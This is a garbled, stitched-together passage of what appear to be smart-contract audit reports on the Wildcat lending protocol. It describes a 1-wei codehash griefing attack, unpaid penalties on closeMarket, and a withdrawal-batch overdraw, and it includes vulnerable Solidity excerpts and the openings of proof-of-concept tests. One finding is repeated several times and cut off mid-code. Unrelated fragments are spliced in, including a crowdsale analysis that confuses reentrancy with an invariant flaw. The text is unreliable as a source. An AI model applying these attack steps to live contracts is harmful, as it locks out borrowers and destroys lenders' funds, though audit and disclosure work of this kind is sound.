`keccak256(\"\")` instead of `bytes32(0)`, making the checks shown above pass incorrectly.\n\nSince all contract deployments in the protocol use `CREATE2`, a malicious attacker can harm users by doing the following:\n- For controller deployments:\n  - Attacker calls  to compute the controller address for a borrower.\n  - Attacker transfers 1 wei to it, causing `.codehash` to become non-zero.\n  - When `deployController()` is called by the borrower, the check passes, causing the function to revert.\n- For market deployments:\n  - Attacker calls  with arguments such that the deployment salt is the same. \n  - Attacker transfers 1 wei to the resulting market address, causing `.codehash` to become non-zero.\n  - When `deployMarket()` is called by the borrower, the function reverts.\n- For escrow deployments:\n  - Attacker calls  with the `borrower`, sanctioned `lender` and market/asset address to compute the resulting escrow address.\n  - Attacker transfers 1 wei to the escrow address, causing `.codehash` to become non-zero.\n  - When either  or  is called, `createEscrow()` simply returns the escrow address instead of deploying an escrow contract.\n  - The market tokens and/or funds of the lender are transferred to the escrow address, causing them to be unrecoverable since the escrow contract was never deployed.\n\nNote that for controller deployments, since the salt is fixed to the `borrower` address and cannot be varied, the DOS for `deployController()` is permanent. This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

            "detail": "\n# Vulnerability details\n\n## Bug Description\n\nIn `WildcatMarketControllerFactory.sol`, registered borrowers can call `deployController()` to deploy a `WildcatMarketController` contract for themselves.\n\nThe function checks if the `codehash` of the controller address is `bytes32(0)` to determine if the controller has already been deployed:\n\n\n\n```solidity\n    // Salt is borrower address\n    bytes32 salt = bytes32(uint256(uint160(msg.sender)));\n    controller = LibStoredInitCode.calculateCreate2Address(\n      ownCreate2Prefix,\n      salt,\n      controllerInitCodeHash\n    );\n    if (controller.codehash != bytes32(0)) { // auditor: This check\n      revert ControllerAlreadyDeployed();\n    }\n```\n\nThis same check is also used in `deployMarket()`, which is called by borrowers to deploy markets:\n\n\n\n```solidity\n    bytes32 salt = _deriveSalt(asset, namePrefix, symbolPrefix);\n    market = LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, marketInitCodeHash);\n    if (market.codehash != bytes32(0)) {\n      revert MarketAlreadyDeployed();\n    }\n```\n\nThis check also exists in `createEscrow()`, which is called by markets to deploy an escrow contract whenever a sanctioned lender gets blocked:\n\n\n\n```solidity\n    escrowContract = getEscrowAddress(borrower, account, asset);\n\n    if (escrowContract.codehash != bytes32(0)) return escrowContract;\n```\n\nHowever, this `<address>.codehash != bytes32(0)` check is insufficient to determine if an address has existing code.\n\nAccording to , addresses without code only return a `0x0` codehash when they are **empty**:\n> In case the account does not exist or is empty (as defined by  `0` is pushed to the stack.\n>\n> In case the account does not have code the keccak256 hash of empty data (i.e. `c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470`) is pushed to the stack.\n\nAs seen from above, addresses without code can also return `keccak256(\"\")` as its codehash if it is non-empty.  states that an address must have a zero ETH balance for it to be empty:\n\n> An account is considered *empty* when it has **no code** and **zero nonce** and **zero balance**.\n\nAs such, if anyone transfers 1 wei to an address, `.codehash` will return `keccak256(\"\")` instead of `bytes32(0)`, making the checks shown above pass incorrectly.\n\nSince all contract deployments in the protocol use `CREATE2`, a malicious attacker can harm users by doing the following:\n- For controller deployments:\n  - Attacker calls  to compute the controller address for a borrower.\n  - Attacker transfers 1 wei to it, causing `.codehash` to become non-zero.\n  - When `deployController()` is called by the borrower, the check passes, causing the function to revert.\n- For market deployments:\n  - Attacker calls  with arguments such that the deployment salt is the same. \n  - Attacker transfers 1 wei to the resulting market address, causing `.codehash` to become non-zero.\n  - When `deployMarket()` is called by the borrower, the function reverts.\n- For escrow deployments:\n  - Attacker calls  with the `borrower`, sanctioned `lender` and market/asset address to compute the resulting escrow address.\n  - Attacker transfers 1 wei to the escrow address, causing `.codehash` to become non-zero.\n  - When either  or  is called, `createEscrow()` simply returns the escrow address instead of deploying an escrow contract.\n  - The market tokens and/or funds of the lender are transferred to the escrow address, causing them to be unrecoverable since the escrow contract was never deployed.\n\nNote that for controller deployments, since the salt is fixed to the `borrower` address and cannot be varied, the DOS for `deployController()` is permanent. This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

            "detail": "\n# Vulnerability details\n\n## Bug Description\n\nIn `WildcatMarketControllerFactory.sol`, registered borrowers can call `deployController()` to deploy a `WildcatMarketController` contract for themselves.\n\nThe function checks if the `codehash` of the controller address is `bytes32(0)` to determine if the controller has already been deployed:\n\n\n\n```solidity\n    // Salt is borrower address\n    bytes32 salt = bytes32(uint256(uint160(msg.sender)));\n    controller = LibStoredInitCode.calculateCreate2Address(\n      ownCreate2Prefix,\n      salt,\n      controllerInitCodeHash\n    );\n    if (controller.codehash != bytes32(0)) { // auditor: This check\n      revert ControllerAlreadyDeployed();\n    }\n```\n\nThis same check is also used in `deployMarket()`, which is called by borrowers to deploy markets:\n\n\n\n```solidity\n    bytes32 salt = _deriveSalt(asset, namePrefix, symbolPrefix);\n    market = LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, marketInitCodeHash);\n    if (market.codehash != bytes32(0)) {\n      revert MarketAlreadyDeployed();\n    }\n```\n\nThis check also exists in `createEscrow()`, which is called by markets to deploy an escrow contract whenever a sanctioned lender gets blocked:\n\n\n\n```solidity\n    escrowContract = getEscrowAddress(borrower, account, asset);\n\n    if (escrowContract.codehash != bytes32(0)) return escrowContract;\n```\n\nHowever, this `<address>.codehash != bytes32(0)` check is insufficient to determine if an address has existing code.\n\nAccording to , addresses without code only return a `0x0` codehash when they are **empty**:\n> In case the account does not exist or is empty (as defined by  `0` is pushed to the stack.\n>\n> In case the account does not have code the keccak256 hash of empty data (i.e. `c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470`) is pushed to the stack.\n\nAs seen from above, addresses without code can also return `keccak256(\"\")` as its codehash if it is non-empty.  states that an address must have a zero ETH balance for it to be empty:\n\n> An account is considered *empty* when it has **no code** and **zero nonce** and **zero balance**.\n\nAs such, if anyone transfers 1 wei to an address, `.codehash` will return `keccak256(\"\")` instead of `bytes32(0)`, making the checks shown above pass incorrectly.\n\nSince all contract deployments in the protocol use `CREATE2`, a malicious attacker can harm users by doing the following:\n- For controller deployments:\n  - Attacker calls  to compute the controller address for a borrower.\n  - Attacker transfers 1 wei to it, causing `.codehash` to become non-zero.\n  - When `deployController()` is called by the borrower, the check passes, causing the function to revert.\n- For market deployments:\n  - Attacker calls  with arguments such that the deployment salt is the same. \n  - Attacker transfers 1 wei to the resulting market address, causing `.codehash` to become non-zero.\n  - When `deployMarket()` is called by the borrower, the function reverts.\n- For escrow deployments:\n  - Attacker calls  with the `borrower`, sanctioned `lender` and market/asset address to compute the resulting escrow address.\n  - Attacker transfers 1 wei to the escrow address, causing `.codehash` to become non-zero.\n  - When either  or  is called, `createEscrow()` simply returns the escrow address instead of deploying an escrow contract.\n  - The market tokens and/or funds of the lender are transferred to the escrow address, causing them to be unrecoverable since the escrow contract was never deployed.\n\nNote that for controller deployments, since the salt is fixed to the `borrower` address and cannot be varied, the DOS for `deployController()` is permanent. This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

            "detail": "\n# Vulnerability details\n\n## Bug Description\n\nIn `WildcatMarketControllerFactory.sol`, registered borrowers can call `deployController()` to deploy a `WildcatMarketController` contract for themselves.\n\nThe function checks if the `codehash` of the controller address is `bytes32(0)` to determine if the controller has already been deployed:\n\n\n\n```solidity\n    // Salt is borrower address\n    bytes32 salt = bytes32(uint256(uint160(msg.sender)));\n    controller = LibStoredInitCode.calculateCreate2Address(\n      ownCreate2Prefix,\n      salt,\n      controllerInitCodeHash\n    );\n    if (controller.codehash != bytes32(0)) { // auditor: This check\n      revert ControllerAlreadyDeployed();\n    }\n```\n\nThis same check is also used in `deployMarket()`, which is called by borrowers to deploy markets:\n\n\n\n```solidity\n    bytes32 salt = _deriveSalt(asset, namePrefix, symbolPrefix);\n    market = LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, marketInitCodeHash);\n    if (market.codehash != bytes32(0)) {\n      revert MarketAlreadyDeployed();\n    }\n```\n\nThis check also exists in `createEscrow()`, which is called by markets to deploy an escrow contract whenever a sanctioned lender gets blocked:\n\n\n\n```solidity\n    escrowContract = getEscrowAddress(borrower, account, asset);\n\n    if (escrowContract.codehash != bytes32(0)) return escrowContract;\n```\n\nHowever, this `<address>.codehash != bytes32(0)` check is insufficient to determine if an address has existing code.\n\nAccording to , addresses without code only return a `0x0` codehash when they are **empty**:\n> In case the account does not exist or is empty (as defined by  `0` is pushed to the stack.\n>\n> In case the account does not have code the keccak256 hash of empty data (i.e. `c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470`) is pushed to the stack.\n\nAs seen from above, addresses without code can also return `keccak256(\"\")` as its codehash if it is non-empty.  states that an address must have a zero ETH balance for it to be empty:\n\n> An account is considered *empty* when it has **no code** and **zero nonce** and **zero balance**.\n\nAs such, if anyone transfers 1 wei to an address, `.codehash` will return `keccak256(\"\")` instead of `bytes32(0)`, making the checks shown above pass incorrectly.\n\nSince all contract deployments in the protocol use `CREATE2`, a malicious attacker can harm users by doing the following:\n- For controller deployments:\n  - Attacker calls  to compute the controller address for a borrower.\n  - Attacker transfers 1 wei to it, causing `.codehash` to become non-zero.\n  - When `deployController()` is called by the borrower, the check passes, causing the function to revert.\n- For market deployments:\n  - Attacker calls  with arguments such that the deployment salt is the same. \n  - Attacker transfers 1 wei to the resulting market address, causing `.codehash` to become non-zero.\n  - When `deployMarket()` is called by the borrower, the function reverts.\n- For escrow deployments:\n  - Attacker calls  with the `borrower`, sanctioned `lender` and market/asset address to compute the resulting escrow address.\n  - Attacker transfers 1 wei to the escrow address, causing `.codehash` to become non-zero.\n  - When either  or  is called, `createEscrow()` simply returns the escrow address instead of deploying an escrow contract.\n  - The market tokens and/or funds of the lender are transferred to the escrow address, causing them to be unrecoverable since the escrow contract was never deployed.\n\nNote that for controller deployments, since the salt is fixed to the `borrower` address and cannot be varied, the DOS for `deployController()` is permanent. This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

            "detail": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext"

However, there is an edge case where, if `marketStatus.commitmentsTotal` is equal to `marketInfo.totalTokens - 1`, the `finalize` function can still succeed, leaving one token within the contract.\n\nSubsequently, `commitEth()` or `commitTokens()` can be called, which due to insufficient checks within the `_addCommitment()` function, can result in an additional token being committed and sold. This results in a discrepancy because `finalize` has already been called and cannot be called again, thus the funds for the last token cannot be retrieved and the last person attempting to withdraw their tokens may be unable to do so due to a shortfall.\n\nThe vulnerability stems from the fact that `_addCommitment()` only checks whether the current time is before `marketInfo.endTime` and does not consider whether the auction has already ended (`auctionEnded()`) or been finalized (`status.finalized`).\n\nTo address this issue, it is recommended to add safeguards in the `_addCommitment` function to ensure no commitments are added after the auction has ended or been finalized, as detailed in the mitigation steps.\n\nThe provided `closeMarket` function from another contract does not appear to be directly relevant to the issue described in the vulnerability report, as it pertains to the closing of a different market mechanism. Therefore, it does not provide additional insight into the reported crowdsale vulnerability, nor does it mitigate that described vulnerability.\n\nThe type of vulnerability indicated as \"Reentrancy\" is typically characterized by the exploitation of function calls that unexpectedly allow control to be transferred back to an external caller before the initial function execution is completed. However, in re-reading the vulnerability report, the issue seems to be more related to an invariant violation rather than classic reentrancy, since it is due to inadequate state checks before performing operations. The vulnerability allows the crowdsale to oversell tokens because a certain state (being finalized) is not being appropriately checked during the commit operations. In a broader sense, it could still fall within the class of reentrancy vulnerabilities because the auction's state is not updated before allowing further interactions that should be prohibited after finalization. Thus, it may be seen as a logical flaw with reentrancy-like consequences.\n\nIn addition to the suggested check, it would also be prudent to ensure that the `commitEth()` and `commitTokens()` functions themselves check whether the auction has been finalized or ended and to disallow any new commitments directly within these functions for added security.",

These batches are tracked using the time of expiry, and when assets are returned to a market with a non-zero withdrawal queue, assets are immediately routed to the unclaimed withdrawals pool and can subsequently be claimed by lenders with the oldest expired withdrawals first.\n\nThe **withdrawalBatchDuration** can be set to zero so lenders do not have to wait before being able to withdraw funds from the market; however, this can cause issues where lenders in a batch can withdraw more than their pro-rata share of the batch's paid assets.\n\nA lender calls **queueWithdrawal** first to initiate the withdrawal; this will place it in a batch respective to its expiry.\n```solidity\nfunction queueWithdrawal(uint256 amount) external nonReentrant {\n        MarketState memory state = _getUpdatedState();\n\n        ...\n\n        // If there is no pending withdrawal batch, create a new one.\n        if (state.pendingWithdrawalExpiry == 0) {\n            state.pendingWithdrawalExpiry = uint32(block.timestamp + withdrawalBatchDuration);\n            emit WithdrawalBatchCreated(state.pendingWithdrawalExpiry);\n        }\n        // Cache batch expiry on the stack for gas savings.\n        uint32 expiry = state.pendingWithdrawalExpiry;\n\n        WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n\n        // Add scaled withdrawal amount to account withdrawal status, withdrawal batch and market state.\n        _withdrawalData.accountStatuses[expiry][msg.sender].scaledAmount += scaledAmount;\n        batch.scaledTotalAmount += scaledAmount;\n        state.scaledPendingWithdrawals += scaledAmount;\n\n        emit WithdrawalQueued(expiry, msg.sender, scaledAmount);\n\n        // Burn as much of the withdrawal batch as possible with available liquidity.\n        uint256 availableLiquidity = batch.availableLiquidityForPendingBatch(state, totalAssets());\n        if (availableLiquidity > 0) {\n            _applyWithdrawalBatchPayment(batch, state, expiry, availableLiquidity);\n        }\n\n        // Update stored batch data\n        _withdrawalData.batches[expiry] = batch;\n\n        // Update stored state\n        _writeState(state);\n    }\n```\n\nNow once the **withdrawalBatchDuration** has passed, a lender can call **executeWithdrawal** to finalize the withdrawal. This will grab the batch and let the lender withdraw a percentage of the batch if the batch is not fully paid or all funds if it is fully paid.\n\n```solidity\nfunction executeWithdrawal(address accountAddress, uint32 expiry) external nonReentrant returns (uint256) {\n        if (expiry > block.timestamp) {\n            revert WithdrawalBatchNotExpired();\n        }\n        MarketState memory state = _getUpdatedState();\n\n        WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n        AccountWithdrawalStatus storage status = _withdrawalData.accountStatuses[expiry][accountAddress];\n\n        uint128 newTotalWithdrawn =\n            uint128(MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount));\n        uint128 normalizedAmountWithdrawn = newTotalWithdrawn - status.normalizedAmountWithdrawn;\n        status.normalizedAmountWithdrawn = newTotalWithdrawn;\n        state.normalizedUnclaimedWithdrawals -= normalizedAmountWithdrawn;\n\n        ...\n\n        // Update stored state\n        _writeState(state);\n\n        return normalizedAmountWithdrawn;\n    }\n```\n\nLet's look at how this percentage is determined: the **newTotalWithdrawn** function determines a lender's available withdrawal amount by multiplying the **normalizedAmountPaid** with the **scaledAmount** and dividing the result by the batch's **scaledTotalAmount**. This ensures that each lender in the batch can withdraw an even amount of the available funds in the batch depending on their **scaledAmount**.\n\n```solidity\n uint128 newTotalWithdrawn =\n            uint128(MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount));\n```\n\nThis works fine when **withdrawalBatchDuration** is set over zero, as the batch values (except **normalizedAmountPaid**) are finalized. However, when set to zero, we can end up with lenders in a batch being able to withdraw more than **normalizedAmountPaid** in that batch, potentially violating protocol invariants.\n\nConsider the following scenario:\n\nThere is only 5 tokens available to burn\n\nLender A calls **queueWithdrawal** with 5 and **executeWithdrawal** instantly.\n    \n    newTotalWithdrawn = (normalizedAmountPaid) * (scaledAmount) / scaledTotalAmount\n    \n    newTotalWithdrawn = 5 * 5 = 25 / 5 = 5\n    \nLender A was able to fully withdraw.\n\nLender B comes along and calls **queueWithdrawal** with 5 and **executeWithdrawal** instantly in the same block.\n    \nThis will add to the same batch as lender A as it is the same expiry.\n    \nNow let's look at **newTotalWithdrawn** for Lender B.\n    \n    newTotalWithdrawn = (normalizedAmountPaid) * (scaledAmount) / scaledTotalAmount\n    \n    newTotalWithdrawn = 5 * 5 = 25 / 10 = 2.5\n    \nLets see what the batch looks like now\n  \n  - Lender A was able to withdraw 5 tokens in the batch\n\n  - Lender B was able to withdraw 2.5 tokens in the batch\n  \n  - The **batch.normalizedAmountPaid** is 5, meaning the Lenders' withdrawal amount surpassed the batch's current limit.\n\n## **Impact:**\n\nThis will break the following invariant in the protocol:\n\n\u201c**Withdrawal execution can only transfer assets that have been counted as paid assets in the corresponding batch, i.e. lenders with withdrawal requests can not withdraw more than their pro-rata share of the batch's paid assets.\u201d**\n\nIt will also mean that funds reserved for other batches may not be able to be fulfilled even if the batch's **normalizedAmountPaid** number shows that it should be able to.\n\n## Proof Of Concept\n\nFor the following test, make sure you use the following parameters in **ExpectedStateTracker**.\n\n```solidity\nMarketParameters internal parameters = MarketParameters({\n        asset: address(0),\n        namePrefix: \"Wildcat \",\n

The flawed logic resides in the '_withdraw' function where value adjustments do not take locked funds into account, and in the burning of shares before real loss accounting.

            "detail": "\n# Vulnerability details\n\n## Bug Description\n\nIn `WildcatMarketControllerFactory.sol`, registered borrowers can call `deployController()` to deploy a `WildcatMarketController` contract for themselves.\n\nThe function checks if the `codehash` of the controller address is `bytes32(0)` to determine if the controller has already been deployed:\n\n\n\n```solidity\n    // Salt is borrower address\n    bytes32 salt = bytes32(uint256(uint160(msg.sender)));\n    controller = LibStoredInitCode.calculateCreate2Address(\n      ownCreate2Prefix,\n      salt,\n      controllerInitCodeHash\n    );\n    if (controller.codehash != bytes32(0)) { // auditor: This check\n      revert ControllerAlreadyDeployed();\n    }\n```\n\nThis same check is also used in `deployMarket()`, which is called by borrowers to deploy markets:\n\n\n\n```solidity\n    bytes32 salt = _deriveSalt(asset, namePrefix, symbolPrefix);\n    market = LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, marketInitCodeHash);\n    if (market.codehash != bytes32(0)) {\n      revert MarketAlreadyDeployed();\n    }\n```\n\nThis check also exists in `createEscrow()`, which is called by markets to deploy an escrow contract whenever a sanctioned lender gets blocked:\n\n\n\n```solidity\n    escrowContract = getEscrowAddress(borrower, account, asset);\n\n    if (escrowContract.codehash != bytes32(0)) return escrowContract;\n```\n\nHowever, this `<address>.codehash != bytes32(0)` check is insufficient to determine if an address has existing code.\n\nAccording to , addresses without code only return a `0x0` codehash when they are **empty**:\n> In case the account does not exist or is empty (as defined by  `0` is pushed to the stack.\n>\n> In case the account does not have code the keccak256 hash of empty data (i.e. `c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470`) is pushed to the stack.\n\nAs seen from above, addresses without code can also return `keccak256(\"\")` as its codehash if it is non-empty.  states that an address must have a zero ETH balance for it to be empty:\n\n> An account is considered *empty* when it has **no code** and **zero nonce** and **zero balance**.\n\nAs such, if anyone transfers 1 wei to an address, `.codehash` will return `keccak256(\"\")` instead of `bytes32(0)`, making the checks shown above pass incorrectly.\n\nSince all contract deployments in the protocol use `CREATE2`, a malicious attacker can harm users by doing the following:\n- For controller deployments:\n  - Attacker calls  to compute the controller address for a borrower.\n  - Attacker transfers 1 wei to it, causing `.codehash` to become non-zero.\n  - When `deployController()` is called by the borrower, the check passes, causing the function to revert.\n- For market deployments:\n  - Attacker calls  with arguments such that the deployment salt is the same. \n  - Attacker transfers 1 wei to the resulting market address, causing `.codehash` to become non-zero.\n  - When `deployMarket()` is called by the borrower, the function reverts.\n- For escrow deployments:\n  - Attacker calls  with the `borrower`, sanctioned `lender` and market/asset address to compute the resulting escrow address.\n  - Attacker transfers 1 wei to the escrow address, causing `.codehash` to become non-zero.\n  - When either  or  is called, `createEscrow()` simply returns the escrow address instead of deploying an escrow contract.\n  - The market tokens and/or funds of the lender are transferred to the escrow address, causing them to be unrecoverable since the escrow contract was never deployed.\n\nNote that for controller deployments, since the salt is fixed to the `borrower` address and cannot be varied, the DOS for `deployController()` is permanent. This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three 